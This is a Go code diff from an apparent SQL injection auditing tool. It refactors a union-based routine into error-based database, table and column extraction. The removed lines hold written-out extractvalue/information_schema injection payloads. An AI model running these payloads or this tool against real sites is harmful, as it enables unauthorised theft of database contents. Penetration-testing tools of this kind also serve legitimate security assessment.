@@ -7,9 +7,9 @@ import (
 	"auditor/entities"
 	"auditor/handlers/common"
 	based "auditor/handlers/sql/base"
+	errorBased "auditor/handlers/sql/base/error"
 	"auditor/payloads/intruder/detect"
 	"log"
-	"regexp"
 	"strings"
 	"sync"
 
@@ -30,7 +30,7 @@ var (
 type ServiceInterface interface {
 	TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error)
 	Init(c *context.Context, f *BaseForm) (interface{}, error)
-	UnionBased(c *context.Context, f *BaseForm) (interface{}, error)
+	ErrorBased(c *context.Context, f *BaseForm) (interface{}, error)
 
 	findPrevious(f *BaseForm) *entities.DBOptions
 	fetchDBNameLength(method based.SQLi)
@@ -70,7 +70,7 @@ func (s *Service) Init(c *context.Context, f *BaseForm) (interface{}, error) {
 		s.pwnLengthValidation(based.LengthValidation)
 	case based.UnionSQLiBased:
 		log.Println("[+] UnionV alidation Detection Method: YES")
-		// pwnErrorbased(based.ErrorSQLiBased)
+		s.pwnErrorbased()
 	}
 
 	return options, nil
@@ -119,16 +119,18 @@ func (s *Service) pwnLengthValidation(method based.SQLi) interface{} {
 	return nil
 }
 
+func (s *Service) pwnErrorbased() (interface{}, error) {
+	// dbLen := based.ExtractDatabaseLen(options)
+	return nil, nil
+}
+
 // time.Now().Format("2006-01-02")
-func (s *Service) UnionBased(c *context.Context, f *BaseForm) (interface{}, error) {
+func (s *Service) ErrorBased(c *context.Context, f *BaseForm) (interface{}, error) {
 	options = entities.URLOptions(f.URL, f.Param, f.Cookie)
-	// html := based.UnionBasedvalidate(options, "")
-	html := based.UnionBasedvalidate(options, "+and+extractvalue(1,concat(%27:%27,database()))")
-	// html := based.UnionBasedvalidate(options, "+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()))))")
 
-	r := regexp.MustCompile(based.ErrXPathQueryFrom)
-	// titles := r.FindString(html)
-	titles := r.FindString(html)
+	errorBased.ExtractDBName(options)
+	errorBased.ExtractTables(options)
+	errorBased.ExtractColumns(options)
 
-	return titles, nil
+	return options, nil
 }
